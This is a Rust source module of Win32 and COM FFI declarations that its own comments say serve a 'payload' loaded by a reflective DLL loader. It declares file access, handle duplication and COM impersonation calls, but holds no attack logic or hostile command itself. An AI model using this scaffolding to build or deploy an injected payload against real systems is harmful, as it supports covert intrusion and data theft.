//! Raw Win32 FFI declarations and constants used by the payload.
//!
//! These are resolved through the normal PE import table, which the reflective
//! loader fixes up before DllMain runs.

#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]

use core::ffi::c_void;

// ---- Handles / return codes ----
pub const INVALID_HANDLE_VALUE: usize = usize::MAX;

// ---- CreateFileW ----
pub const GENERIC_READ: u32 = 0x8000_0000;
pub const GENERIC_WRITE: u32 = 0x4000_0000;
pub const FILE_SHARE_READ: u32 = 0x1;
pub const FILE_SHARE_WRITE: u32 = 0x2;
pub const FILE_SHARE_DELETE: u32 = 0x4;
pub const OPEN_EXISTING: u32 = 3;
pub const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;

// ---- GetFileType ----
pub const FILE_TYPE_DISK: u32 = 0x0001;

// ---- DuplicateHandle ----
pub const DUPLICATE_SAME_ACCESS: u32 = 0x0000_0002;

// ---- Errors ----
pub const ERROR_SHARING_VIOLATION: u32 = 32;

// ---- GetFileSize ----
pub const INVALID_FILE_SIZE: u32 = 0xFFFF_FFFF;

// ---- COM ----
pub const COINIT_APARTMENTTHREADED: u32 = 0x2;
pub const CLSCTX_LOCAL_SERVER: u32 = 0x4;
pub const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
pub const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
pub const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
pub const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
pub const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;
pub const RPC_E_CHANGED_MODE: i32 = 0x8001_0106u32 as i32;

// ---- GUID ----
#[repr(C)]
#[derive(Clone, Copy)]
pub struct GUID {
    pub data1: u32,
    pub data2: u16,
    pub data3: u16,
    pub data4: [u8; 8],
}

#[link(name = "kernel32")]
extern "system" {
    pub fn DisableThreadLibraryCalls(hLibModule: usize) -> i32;
    pub fn GetEnvironmentVariableW(
        lpName: *const u16,
        lpBuffer: *mut u16,
        nSize: u32,
    ) -> u32;
    pub fn CreateFileW(
        lpFileName: *const u16,
        dwDesiredAccess: u32,
        dwShareMode: u32,
        lpSecurityAttributes: *mut c_void,
        dwCreationDisposition: u32,
        dwFlagsAndAttributes: u32,
        hTemplateFile: usize,
    ) -> usize;
    pub fn ReadFile(
        hFile: usize,
        lpBuffer: *mut c_void,
        nNumberOfBytesToRead: u32,
        lpNumberOfBytesRead: *mut u32,
        lpOverlapped: *mut c_void,
    ) -> i32;
    pub fn WriteFile(
        hFile: usize,
        lpBuffer: *const c_void,
        nNumberOfBytesToWrite: u32,
        lpNumberOfBytesWritten: *mut u32,
        lpOverlapped: *mut c_void,
    ) -> i32;
    pub fn FlushFileBuffers(hFile: usize) -> i32;
    pub fn CloseHandle(hObject: usize) -> i32;
    pub fn GetFileType(hFile: usize) -> u32;
    pub fn GetFinalPathNameByHandleW(
        hFile: usize,
        lpszFilePath: *mut u16,
        cchFilePath: u32,
        dwFlags: u32,
    ) -> u32;
    pub fn DuplicateHandle(
        hSourceProcessHandle: usize,
        hSourceHandle: usize,
        hTargetProcessHandle: usize,
        lpTargetHandle: *mut usize,
        dwDesiredAccess: u32,
        bInheritHandle: i32,
        dwOptions: u32,
    ) -> i32;
    pub fn GetCurrentProcess() -> usize;
    pub fn GetFileSize(hFile: usize, lpFileSizeHigh: *mut u32) -> u32;
    pub fn GetLastError() -> u32;
}

#[link(name = "ole32")]
extern "system" {
    pub fn CoInitializeEx(pvReserved: *mut c_void, dwCoInit: u32) -> i32;
    pub fn CoUninitialize();
    pub fn CoCreateInstance(
        rclsid: *const GUID,
        pUnkOuter: *mut c_void,
        dwClsContext: u32,
        riid: *const GUID,
        ppv: *mut *mut c_void,
    ) -> i32;
    pub fn CoSetProxyBlanket(
        pProxy: *mut c_void,
        dwAuthnSvc: u32,
        dwAuthzSvc: u32,
        pServerPrincName: *mut u16,
        dwAuthnLevel: u32,
        dwImpLevel: u32,
        pAuthInfo: *mut c_void,
        dwCapabilities: u32,
    ) -> i32;
}

#[link(name = "oleaut32")]
extern "system" {
    pub fn SysAllocStringByteLen(psz: *const u8, len: u32) -> *mut u16;
    pub fn SysFreeString(bstrString: *mut u16);
    pub fn SysStringByteLen(bstrString: *mut u16) -> u32;
}
